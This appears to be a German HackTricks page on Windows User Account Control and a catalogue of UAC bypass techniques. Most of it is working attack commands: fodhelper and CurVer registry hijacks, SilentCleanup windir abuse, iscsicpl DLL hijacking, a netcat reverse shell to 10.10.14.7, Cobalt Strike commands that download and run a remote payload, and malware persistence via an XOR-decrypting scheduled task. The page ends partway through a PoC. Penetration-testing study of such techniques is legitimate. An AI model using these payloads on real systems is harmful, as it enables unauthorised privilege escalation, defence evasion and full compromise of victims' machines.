# UAC - User Account Control

{{#include ../../banners/hacktricks-training.md}}

## UAC

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) ist eine Funktion, die eine **Zustimmungsabfrage für Aktionen mit erhöhten Rechten** ermöglicht. Anwendungen verfügen über unterschiedliche `integrity`-Stufen, und ein Programm mit einer **hohen Stufe** kann Aufgaben ausführen, die das **System potenziell gefährden könnten**. Wenn UAC aktiviert ist, **werden Anwendungen und Aufgaben immer im Sicherheitskontext eines Nicht-Administratorkontos ausgeführt**, sofern ein Administrator diesen Anwendungen bzw. Aufgaben nicht ausdrücklich den Zugriff auf das System auf Administratorebene gestattet. Es handelt sich um eine Komfortfunktion, die Administratoren vor unbeabsichtigten Änderungen schützt, jedoch nicht als Sicherheitsgrenze betrachtet wird.<sup>[[2]](#references)</sup>

Weitere Informationen zu Integritätsstufen:


{{#ref}}
../windows-local-privilege-escalation/integrity-levels.md
{{#endref}}

Wenn UAC aktiv ist, erhält ein Administratorbenutzer 2 Token: ein Standardbenutzertoken zur Ausführung regulärer Aktionen mit mittlerer Integrität und eines mit den Administratorberechtigungen.

Diese [Seite](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) erklärt ausführlich, wie UAC funktioniert, und umfasst den Anmeldevorgang, die Benutzererfahrung sowie die UAC-Architektur.<sup>[[2]](#references)</sup> Administratoren können Sicherheitsrichtlinien verwenden, um die Funktionsweise von UAC auf lokaler Ebene für ihre Organisation zu konfigurieren (mit secpol.msc) oder sie in einer Active-Directory-Domänenumgebung über Gruppenrichtlinienobjekte (GPO) zu konfigurieren und bereitzustellen. Die verschiedenen Einstellungen werden [hier](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings) ausführlich beschrieben. Für UAC können 10 Gruppenrichtlinieneinstellungen konfiguriert werden. Die folgende Tabelle enthält weitere Details:

| Gruppenrichtlinieneinstellung                                                                                                                                                                                                                                                                                                                                                           | Registrierungsschlüssel                | Standardeinstellung                                              |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------- | ------------------------------------------------------------ |
| [User Account Control: Admin Approval Mode for the built-in Administrator account](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                                                                           | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\FilterAdministratorToken`   | `0` (Deaktiviert)                                             |
| [User Account Control: Behavior of the elevation prompt for administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` | `5` (Zustimmungsabfrage für Nicht-Windows-Binärdateien auf dem sicheren Desktop) |
| [User Account Control: Behavior of the elevation prompt for standard users](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorUser`  | `1` (Abfrage von Anmeldeinformationen auf dem sicheren Desktop)         |
| [User Account Control: Detect application installations and prompt for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                                                                 | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableInstallerDetection`   | `1` (Aktiviert; in Enterprise standardmäßig deaktiviert)           |
| [User Account Control: Only elevate executables that are signed and validated](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ValidateAdminCodeSignatures` | `0` (Deaktiviert)                                             |
| [User Account Control: Only elevate UIAccess applications that are installed in secure locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableSecureUIAPaths`       | `1` (Aktiviert)                                              |
| [User Account Control: Run all administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                                                                            | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA`                  | `1` (Aktiviert)                                              |
| [User Account Control: Allow UIAccess applications to prompt for elevation without using the secure desktop](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop)                                   | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableUIADesktopToggle`     | `0` (Deaktiviert)                                             |
| [User Account Control: Switch to the secure desktop when prompting for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                                               | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\PromptOnSecureDesktop`      | `1` (Aktiviert)                                              |
| [User Account Control: Virtualize file and registry write failures to per-user locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableVirtualization`       | `1` (Aktiviert)                                              |

### Richtlinien für die Installation von Software unter Windows

Die **lokalen Sicherheitsrichtlinien** ("secpol.msc" auf den meisten Systemen) sind standardmäßig so konfiguriert, dass sie **Nicht-Administratoren an der Installation von Software hindern**. Das bedeutet, dass ein Nicht-Administrator die Installationsdatei deiner Software zwar herunterladen kann, sie jedoch ohne ein Administratorkonto nicht ausführen kann.

### Registrierungsschlüssel, um UAC zur Abfrage einer Erhöhung zu zwingen

Als Standardbenutzer ohne Administratorrechte kannst du sicherstellen, dass das "Standardkonto" **von UAC zur Eingabe von Anmeldeinformationen aufgefordert wird**, wenn es versucht, bestimmte Aktionen auszuführen. Dazu müssen bestimmte **Registrierungsschlüssel** geändert werden, wofür du Administratorberechtigungen benötigst, sofern kein **UAC bypass** vorliegt oder der Angreifer bereits als Administrator angemeldet ist.

Auch wenn der Benutzer Mitglied der Gruppe **Administrators** ist, zwingen diese Änderungen den Benutzer dazu, seine **Kontodaten erneut einzugeben**, um administrative Aktionen auszuführen.

**In der Praxis ist dies nur nützlich, wenn du bereits über ein Token mit erhöhten Rechten, einen UAC bypass oder eine Fehlkonfiguration verfügst, die das Ändern dieser Schlüssel ermöglicht; andernfalls wird der Schreibzugriff auf die Registrierung selbst blockiert.**

Die Registrierungsschlüssel und Einträge, die geändert werden müssen, lauten wie folgt (mit ihren Standardwerten in Klammern):

- `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System`:
- `ConsentPromptBehaviorUser` = 1 (3)
- `ConsentPromptBehaviorAdmin` = 1 (5)
- `PromptOnSecureDesktop` = 1 (1)

Dies kann auch manuell über das Tool für lokale Sicherheitsrichtlinien durchgeführt werden. Nach der Änderung wird der Benutzer bei administrativen Vorgängen aufgefordert, seine Anmeldeinformationen erneut einzugeben.

### Hinweis

**User Account Control ist keine Sicherheitsgrenze.** Daher können Standardbenutzer ihre Konten nicht verlassen und Administratorrechte erlangen, ohne einen Exploit zur lokalen Rechteausweitung zu verwenden.

### Einen Benutzer nach "vollständigem Computerzugriff" fragen
```powershell
hostname | Set-Clipboard
Enable-PSRemoting -SkipNetworkProfileCheck -Force

cd C:\Users\hacedorderanas\Desktop
New-PSSession -Name "Case ID: 1527846" -ComputerName hostname
Enter-PSSession -ComputerName hostname
```
### UAC-Berechtigungen

- Internet Explorer Protected Mode verwendet Integritätsprüfungen, um zu verhindern, dass Prozesse mit hoher Integritätsstufe (wie Webbrowser) auf Daten mit niedriger Integritätsstufe (wie den Ordner für temporäre Internetdateien) zugreifen. Dies wird erreicht, indem der Browser mit einem Token mit niedriger Integritätsstufe ausgeführt wird. Wenn der Browser versucht, auf Daten zuzugreifen, die in der Zone mit niedriger Integritätsstufe gespeichert sind, überprüft das Betriebssystem die Integritätsstufe des Prozesses und gewährt den Zugriff entsprechend. Diese Funktion hilft dabei, zu verhindern, dass Remote-Codeausführung-Angriffe Zugriff auf vertrauliche Daten auf dem System erhalten.
- Wenn sich ein Benutzer bei Windows anmeldet, erstellt das System ein Zugriffstoken, das eine Liste der Berechtigungen des Benutzers enthält. Berechtigungen sind als Kombination aus den Rechten und Fähigkeiten eines Benutzers definiert. Das Token enthält außerdem eine Liste der Anmeldeinformationen des Benutzers. Diese Anmeldeinformationen werden verwendet, um den Benutzer am Computer und bei Ressourcen im Netzwerk zu authentifizieren.

### Autoadminlogon

Um Windows so zu konfigurieren, dass beim Start automatisch ein bestimmter Benutzer angemeldet wird, legen Sie den **`AutoAdminLogon`-Registrierungsschlüssel** fest. Dies ist für Kiosk-Umgebungen oder Testzwecke nützlich. Verwenden Sie dies nur auf sicheren Systemen, da dadurch das Passwort in der Registry offengelegt wird.

Legen Sie die folgenden Schlüssel mit dem Registrierungs-Editor oder `reg add` fest:

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`:
- `AutoAdminLogon` = 1
- `DefaultUsername` = username
- `DefaultPassword` = password

Um das normale Anmeldeverhalten wiederherzustellen, setzen Sie `AutoAdminLogon` auf 0.

## UAC bypass

> [!TIP]
> Beachten Sie, dass UAC bypass unkompliziert ist, wenn Sie grafischen Zugriff auf das Opfer haben, da Sie einfach auf „Ja“ klicken können, sobald die UAC-Eingabeaufforderung erscheint.

UAC bypass wird in folgender Situation benötigt: **UAC ist aktiviert, Ihr Prozess läuft in einem Kontext mit mittlerer Integritätsstufe und Ihr Benutzer gehört zur Administratorengruppe.**

Es ist wichtig zu erwähnen, dass es **wesentlich schwieriger ist, UAC zu umgehen, wenn die höchste Sicherheitsstufe (Always) aktiviert ist, als bei jeder der anderen Stufen (Default).**

### Schnelle Triage aus einer Shell mit mittlerer Integritätsstufe

Bevor Sie einen Bypass versuchen, bestätigen Sie, dass Sie sich im richtigen Szenario befinden, und ordnen Sie den Host-Build bekannten, funktionierenden Methoden zu:
```powershell
whoami /groups
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v PromptOnSecureDesktop
powershell -c "Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion' | select ProductName,DisplayVersion,CurrentBuild,UBR"
schtasks /Query /TN "\Microsoft\Windows\DiskCleanup\SilentCleanup"
```
Praktische Hinweise:
- Wenn `EnableLUA=0` ist, benötigst du keinen Bypass: Jeder Admin-Token kann direkt eine hohe Integrität anfordern.
- `ConsentPromptBehaviorAdmin=2` oder `5` ist das häufige Szenario für Auto-Elevate- / COM-basierte Bypasses.
- `Always Notify` erhöht die Hürde, aber du solltest trotzdem den exakten Build testen, statt von einem Fehlschlag auszugehen: UACME führt weiterhin einige mit `AlwaysNotify compatible` gekennzeichnete Methoden für moderne Windows-Builds.<sup>[[3]](#references)</sup>

### UAC deaktiviert

Wenn UAC bereits deaktiviert ist (`ConsentPromptBehaviorAdmin` ist **`0`**), kannst du eine reverse shell mit Admin-Rechten (hohem Integritätslevel) beispielsweise wie folgt **ausführen**:
```bash
#Put your reverse shell instead of "calc.exe"
Start-Process powershell -Verb runAs "calc.exe"
Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
```
#### UAC bypass with token duplication

- [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
- [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)

### **Sehr** grundlegender UAC-„bypass“ (vollständiger Dateisystemzugriff)

Wenn du eine shell mit einem Benutzer hast, der Mitglied der Gruppe Administrators ist, kannst du die über SMB (Dateisystem) freigegebene **C$**-Freigabe lokal auf einem neuen Laufwerk mounten und erhältst **Zugriff auf alles innerhalb des Dateisystems** (sogar auf den Home-Ordner des Administrators).

> [!WARNING]
> **Sieht so aus, als würde dieser Trick nicht mehr funktionieren**
```bash
net use Z: \\127.0.0.1\c$
cd C$

#Or you could just access it:
dir \\127.0.0.1\c$\Users\Administrator\Desktop
```
### UAC-Umgehung mit Cobalt Strike

Die Cobalt Strike-Techniken funktionieren nur, wenn UAC nicht auf die maximale Sicherheitsstufe eingestellt ist.
```bash
# UAC bypass via token duplication
elevate uac-token-duplication [listener_name]
# UAC bypass via service
elevate svc-exe [listener_name]

# Bypass UAC with Token Duplication
runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
# Bypass UAC with CMSTPLUA COM interface
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
```
**Empire** und **Metasploit** verfügen ebenfalls über mehrere Module zum **Umgehen** der **UAC**.

### Elevated COM interfaces (`ICMLuaUtil` / `CMSTPLUA`)

Auto-elevated COM objects bleiben auf modernen Builds eine praktische UAC-Angriffsfläche. `ICMLuaUtil` wird von UACME weiterhin als auf aktuellen Windows-Branches funktionsfähig geführt, und offensive Tools passen `CMSTPLUA` weiterhin an, indem sie einen interaktiven Desktop-Prozess, eine 64-Bit-Ausführung und manchmal PEB-/Prozess-Masquerading kombinieren, bevor sie den COM Elevation Moniker aufrufen.<sup>[[3]](#references)</sup>

Praktische Tipps:
- Bevorzugt einen **64-Bit**-Prozess in der **interaktiven Sitzung** des Benutzers verwenden (üblicherweise `explorer.exe` oder einen untergeordneten Prozess davon).
- Wenn eine Raw Shell fehlschlägt, erneut aus einer BOF- / UACME-Implementierung heraus versuchen, statt einen naiven `CreateProcess`-Wrapper zu verwenden.
- Damit rechnen, dass die Ausführung des Child-Prozesses in einem **separaten erhöhten Prozess** erfolgt; viele BOFs erhöhen den aktuellen Beacon nicht direkt.

### KRBUACBypass

Dokumentation und Tool unter [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass)

### UAC bypass exploits

[**UACME** ](https://github.com/hfiref0x/UACME), eine **Sammlung** mehrerer UAC bypass exploits. Beachten, dass UACME mit visual studio oder msbuild **kompiliert** werden muss. Die Kompilierung erstellt mehrere ausführbare Dateien (wie `Source\Akagi\outout\x64\Debug\Akagi.exe`); du musst wissen, **welche davon benötigt wird.**\
Du solltest **vorsichtig sein**, da einige Bypasses **andere Programme starten**, die den **Benutzer** darauf **hinweisen**, dass etwas passiert.<sup>[[3]](#references)</sup>

UACME enthält die **Build-Version, ab der jede Technik funktioniert**.<sup>[[3]](#references)</sup> Du kannst nach einer Technik suchen, die deine Versionen betrifft:
```powershell
PS C:\> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```
Außerdem erhältst du anhand [dieser](https://en.wikipedia.org/wiki/Windows_10_version_history) Seite den Windows-Release `1607` aus den Build-Versionen.

Ein praktischer Workflow besteht darin, zunächst den **Host-Build zu bewerten** und erst anschließend die passende Methode auszuführen:
```cmd
python main.py --scan uac
Akagi64.exe 33 C:\Windows\System32\cmd.exe
```
- `WinPwnage` vergleicht den lokalen Build schnell mit seinen bekannten UAC-Methoden, was hilfreich ist, um veraltete PoCs zügig auszusortieren.<sup>[[4]](#references)</sup>
- `UACME` bleibt der beste öffentliche Katalog, um einen Bypass einem bestimmten Build zuzuordnen. In aktuellen Releases wurden neue Methoden hinzugefügt und bestehende gegen **Windows 11 25H2** erneut getestet. Daher sollte die README bzw. die Release Notes geprüft werden, bevor angenommen wird, dass ein älterer Blogbeitrag unverändert noch gilt.<sup>[[3]](#references)</sup>

### UAC Bypass – fodhelper.exe (Registry hijack)

Die vertrauenswürdige Binärdatei `fodhelper.exe` wird unter modernen Windows-Versionen automatisch mit erhöhten Rechten ausgeführt. Beim Start fragt sie den folgenden Registry-Pfad pro Benutzer ab, ohne das Verb `DelegateExecute` zu validieren. Ein dort platzierter Befehl ermöglicht es einem Prozess mit Medium Integrity (Benutzer ist Mitglied der Gruppe Administrators), ohne UAC-Eingabeaufforderung einen Prozess mit High Integrity zu starten.

Vom `fodhelper` abgefragter Registry-Pfad:
```text
HKCU\Software\Classes\ms-settings\Shell\Open\command
```
<details>
<summary>PowerShell-Schritte (Payload festlegen, dann auslösen)</summary>
```powershell
# Optional: from a 32-bit shell on 64-bit Windows, spawn a 64-bit PowerShell for stability
C:\\Windows\\sysnative\\WindowsPowerShell\\v1.0\\powershell -nop -w hidden -c "$PSVersionTable.PSEdition"

# 1) Create the vulnerable key and values
New-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force | Out-Null

# 2) Set default command to your payload (example: reverse shell or cmd)
# Replace <BASE64_PS> with your base64-encoded PowerShell (or any command)
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -e <BASE64_PS>" -Force

# 3) Trigger auto-elevation
Start-Process -FilePath "C:\\Windows\\System32\\fodhelper.exe"

# 4) (Recommended) Cleanup
Remove-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open" -Recurse -Force
```
</details>
Hinweise:
- Funktioniert, wenn der aktuelle Benutzer Mitglied der Administrators ist und die UAC-Ebene auf dem Standardwert/locker eingestellt ist (nicht auf Always Notify mit zusätzlichen Einschränkungen).
- Verwende den `sysnative`-Pfad, um eine 64-Bit-PowerShell aus einem 32-Bit-Prozess unter 64-Bit-Windows zu starten.
- Der Payload kann ein beliebiger Befehl sein (PowerShell, cmd oder ein EXE-Pfad). Vermeide für mehr Stealth auffordernde UIs.

#### CurVer/extension hijack variant (nur HKCU)

Neuere Samples, die `fodhelper.exe` missbrauchen, vermeiden `DelegateExecute` und leiten stattdessen die `ms-settings`-ProgID über den benutzerbezogenen `CurVer`-Wert um. Die automatisch erhöht gestartete Binary löst den Handler weiterhin unter `HKCU` auf, sodass kein Administratortoken erforderlich ist, um die Schlüssel anzulegen:<sup>[[5]](#references)</sup>
```powershell
# Point ms-settings to a custom extension (.thm) and map that extension to our payload
New-Item -Path "HKCU:\Software\Classes\.thm\Shell\Open" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\.thm\Shell\Open\command" -Name "(default)" -Value "C:\\ProgramData\\rKXujm.exe" -Force | Out-Null
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings" -Name "CurVer" -Value ".thm" -Force

Start-Process "C:\\Windows\\System32\\fodhelper.exe"   # auto-elevates and runs rKXujm.exe
```
Nach der Erhöhung der Rechte **deaktiviert** Malware üblicherweise **zukünftige Eingabeaufforderungen**, indem sie `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` auf `0` setzt. Anschließend führt sie weitere Defense Evasion durch (z. B. `Add-MpPreference -ExclusionPath C:\ProgramData`) und erstellt die Persistenz neu, um mit hoher Integritätsstufe ausgeführt zu werden. Eine typische Persistenzaufgabe speichert ein **XOR-verschlüsseltes PowerShell-Skript** auf der Festplatte und entschlüsselt bzw. führt es jede Stunde im Arbeitsspeicher aus:<sup>[[5]](#references)</sup>
```powershell
schtasks /create /sc hourly /tn "OneDrive Startup Task" /rl highest /tr "cmd /c powershell -w hidden $d=[IO.File]::ReadAllBytes('C:\ProgramData\VljE\zVJs.ps1');$k=[Text.Encoding]::UTF8.GetBytes('Q');for($i=0;$i -lt $d.Length;$i++){$d[$i]=$d[$i]-bxor$k[$i%$k.Length]};iex ([Text.Encoding]::UTF8.GetString($d))"
```
Diese Variante bereinigt weiterhin den Dropper und hinterlässt nur die gestaged payloads, sodass die Erkennung auf der Überwachung des **`CurVer`-Hijacks**, der Manipulation von `ConsentPromptBehaviorAdmin`, der Erstellung von Defender-Ausschlüssen oder von scheduled tasks beruht, die PowerShell im Speicher entschlüsseln.<sup>[[5]](#references)</sup>

### UAC bypass über die Aufgabe `SilentCleanup` (`HKCU\Environment\windir`)

`SilentCleanup` startet `cleanmgr.exe` mit höchsten Berechtigungen und erweitert `%windir%` aus der Benutzerumgebung. Wenn du `HKCU\Environment\windir` kontrollierst, kannst du diese Erweiterung auf einen beliebigen Befehl umleiten und ohne Zustimmungsdialog eine hohe Integrität erlangen.<sup>[[8]](#references)</sup> Diese Methode ist auf aktuellen Builds weiterhin einen Test wert, da UACME die Technik weiterhin aktiviert hält und das aktuelle Issue-Tracking zeigt, dass Windows 11 24H2 möglicherweise nur geringfügige Anpassungen der Anführungszeichen erfordert.<sup>[[3]](#references)</sup>
```cmd
reg add "HKCU\Environment" /v windir /d "cmd.exe /c start powershell.exe" /f
schtasks /Run /TN "\Microsoft\Windows\DiskCleanup\SilentCleanup"
reg delete "HKCU\Environment" /v windir /f
```
Wenn die Aufgabe den Pfad in diesem Build in Anführungszeichen setzt, wiederhole den Versuch mit einem Payload, der mit einem Anführungszeichen endet (zum Beispiel `cmd.exe"`). Bereinige `HKCU\Environment\windir` nach dem Test immer.

#### Weitere UAC bypasses

Viele klassische UAC bypasses, die UI-Flows, COM-Objekte oder Desktop-Interaktion missbrauchen, erfordern eine **vollständige interaktive Sitzung** mit dem Opfer; eine gewöhnliche `nc.exe`-Shell oder ein in **Session 0** laufender Service reicht oft nicht aus.

Das lässt sich häufig mit einer **meterpreter**-Sitzung lösen. Migriere zu einem **Prozess**, dessen **Session**-Wert gleich **1** ist:

![ms-settings auf eine benutzerdefinierte Erweiterung (.thm) zeigen lassen und diese Erweiterung unserem Payload zuordnen - Weitere UAC bypasses: Dies ist über eine meterpreter-Sitzung möglich. Migriere zu einem Prozess, dessen Session...](<../../images/image (863).png>)

(_explorer.exe_ sollte funktionieren)

### UAC Bypass mit GUI

Wenn du Zugriff auf eine **GUI** hast, kannst du die UAC-Eingabeaufforderung einfach **akzeptieren**, sobald sie erscheint; du brauchst nicht wirklich einen technischen Bypass. Daher reicht eine GUI-Sitzung oft aus, um die praktischen Einschränkungen zu umgehen, die durch UAC entstehen.

Wenn du außerdem eine GUI-Sitzung erhältst, die jemand verwendet hat (möglicherweise über RDP), werden dort möglicherweise **einige Tools als Administrator ausgeführt**, über die du beispielsweise direkt eine **cmd** **als Administrator ausführen** kannst, ohne erneut von UAC dazu aufgefordert zu werden, wie bei [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif). Dies könnte etwas **unauffälliger** sein.

### Lauter Brute-Force-UAC-bypass

Wenn dir auffälliges Verhalten egal ist, kannst du jederzeit **etwas wie** [**https://github.com/Chainski/ForceAdmin**](https://github.com/Chainski/ForceAdmin) **ausführen**, das **so lange nach erhöhten Berechtigungen fragt, bis der Benutzer dies akzeptiert**.

### Dein eigener Bypass - Grundlegende UAC-bypass-Methodik

Wenn du dir **UACME** ansiehst, wirst du feststellen, dass **viele UAC bypasses DLL hijacking missbrauchen** (häufig, indem ein erhöhtes Binary dazu gebracht wird, eine vom Angreifer kontrollierte DLL aus einem beschreibbaren Pfad zu laden). [Lies dies, um zu erfahren, wie du eine DLL-hijacking-Schwachstelle findest](../windows-local-privilege-escalation/dll-hijacking/index.html).

1. Finde ein Binary, das **autoelevate** (überprüfe, dass es bei der Ausführung mit einer hohen Integritätsstufe läuft).
2. Finde mit Procmon "**NAME NOT FOUND**"-Ereignisse, die für **DLL Hijacking** anfällig sein könnten.
3. Wahrscheinlich musst du die DLL in einige **geschützte Pfade** schreiben (wie C:\Windows\System32), für die du keine Schreibberechtigungen hast. Dies kannst du umgehen mit:
1. **wusa.exe**: Windows 7, 8 und 8.1. Damit kann der Inhalt einer CAB-Datei in geschützte Pfade extrahiert werden (weil dieses Tool mit einer hohen Integritätsstufe ausgeführt wird).
2. **IFileOperation**: Windows 10.
4. Bereite ein **Script** vor, das deine DLL in den geschützten Pfad kopiert und das anfällige und automatisch erhöhte Binary ausführt.

### Eine weitere UAC-bypass-Technik

Dabei wird überprüft, ob ein **autoElevated binary** versucht, aus der **Registry** den **Namen/Pfad** eines **Binaries** oder **Commands** zu **lesen**, das bzw. der **ausgeführt** werden soll (dies ist besonders interessant, wenn das Binary diese Informationen innerhalb von **HKCU** sucht).

### UAC bypass über `SysWOW64\iscsicpl.exe` + DLL hijack über den Benutzer-`PATH`

Das 32-Bit-Binary `C:\Windows\SysWOW64\iscsicpl.exe` ist ein **auto-elevated** Binary, das dazu missbraucht werden kann, `iscsiexe.dll` über die Suchreihenfolge zu laden. Wenn du eine bösartige `iscsiexe.dll` in einem **vom Benutzer beschreibbaren** Ordner platzieren und anschließend den `PATH` des aktuellen Benutzers ändern kannst (zum Beispiel über `HKCU\Environment\Path`), sodass dieser Ordner durchsucht wird, lädt Windows möglicherweise die Angreifer-DLL in den Prozess des erhöhten `iscsicpl.exe`, **ohne eine UAC-Eingabeaufforderung anzuzeigen**.<sup>[[1]](#references)[[6]](#references)</sup>

Praktische Hinweise:
- Dies ist nützlich, wenn der aktuelle Benutzer Mitglied der **Administrators**-Gruppe ist, aber aufgrund von UAC mit **Medium Integrity** ausgeführt wird.
- Die Kopie unter **SysWOW64** ist für diesen Bypass relevant. Behandle die Kopie unter **System32** als separates Binary und überprüfe das Verhalten unabhängig.
- Das Primitive ist eine Kombination aus **Auto-Elevation** und **DLL search-order hijacking**. Daher ist derselbe ProcMon-Workflow wie bei anderen UAC bypasses nützlich, um das Laden der fehlenden DLL zu bestätigen.

Minimaler Ablauf:
```cmd
copy iscsiexe.dll %TEMP%\iscsiexe.dll
reg add "HKCU\Environment" /v Path /t REG_SZ /d "%TEMP%" /f
C:\Windows\System32\cmd.exe /c C:\Windows\SysWOW64\iscsicpl.exe
```
Erkennungsideen:
- Auf `reg add` / Registry-Schreibvorgänge nach `HKCU\Environment\Path` alarmieren, wenn unmittelbar danach `C:\Windows\SysWOW64\iscsicpl.exe` ausgeführt wird.
- Nach `iscsiexe.dll` in **benutzerkontrollierten** Verzeichnissen wie `%TEMP%` oder `%LOCALAPPDATA%\Microsoft\WindowsApps` suchen.
- Starts von `iscsicpl.exe` mit unerwarteten Kindprozessen oder DLL-Ladevorgängen außerhalb der normalen Windows-Verzeichnisse korrelieren.

### Neuere Forschung, die separat geprüft werden sollte

Einige Chains nach 2024 sehen nicht mehr wie die klassischen Registry-Hijacks unter `HKCU\Software\Classes` aus. Beispielsweise kann activation-context cache poisoning ein **drive remap** und eine **DLL redirection** verknüpfen, um sich von mittlerer zu hoher Integrität über vertrauenswürdige UI- / auto-elevated binaries wie `ctfmon.exe` und spätere Ziele wie `fodhelper.exe` zu bewegen. Statt das umfangreiche PoC hier zu duplizieren, siehe die kompakten Payload-Beispiele unter:

{{#ref}}
../windows-local-privilege-escalation/windows-c-payloads.md
{{#endref}}

### „Administrator Protection“ (25H2) drive-letter hijack über per-logon-session DOS device map

Die vollständige Angriffsfläche von `RAiLaunchAdminProcess` / UIAccess unter Windows 11 25H2 findest du auf der dedizierten Seite:

{{#ref}}
../windows-local-privilege-escalation/uiaccess-admin-protection-bypass.md
{{#endref}}

Windows 11 25H2 „Administrator Protection“ verwendet shadow-admin tokens mit sitzungsspezifischen `\Sessions\0\DosDevices/<LUID>`-Maps. Das Verzeichnis wird von `SeGetTokenDeviceMap` bei der ersten `\??`-Auflösung verzögert erstellt. Wenn der Angreifer das shadow-admin token nur auf **SecurityIdentification** impersoniert, wird das Verzeichnis mit dem Angreifer als **owner** erstellt (es erbt `CREATOR OWNER`), wodurch drive-letter links Vorrang vor `\GLOBAL??` erhalten.<sup>[[7]](#references)</sup>

**Schritte:**

1. Rufe aus einer Sitzung mit geringen Rechten `RAiProcessRunOnce` auf, um ein promptloses shadow-admin-`runonce.exe` zu starten.
2. Dupliziere dessen primäres Token in ein **identification**-Token und impersoniere es, während du `\??` öffnest, um die Erstellung von `\Sessions\0\DosDevices/<LUID>` unter der Kontrolle des Angreifers zu erzwingen.
3. Erstelle dort einen `C:`-Symlink, der auf vom Angreifer kontrollierten Speicher zeigt; nachfolgende Dateisystemzugriffe in dieser Sitzung lösen `C:` zum Angreiferpfad auf und ermöglichen einen DLL/file hijack ohne Prompt.

**PowerShell-PoC (NtObjectManager):**
```powershell
$pid = Invoke-RAiProcessRunOnce
$p = Get-Process -Id $pid
$t = Get-NtToken -Process $p
$id = New-NtTokenDuplicate -Token $t -ImpersonationLevel Identification
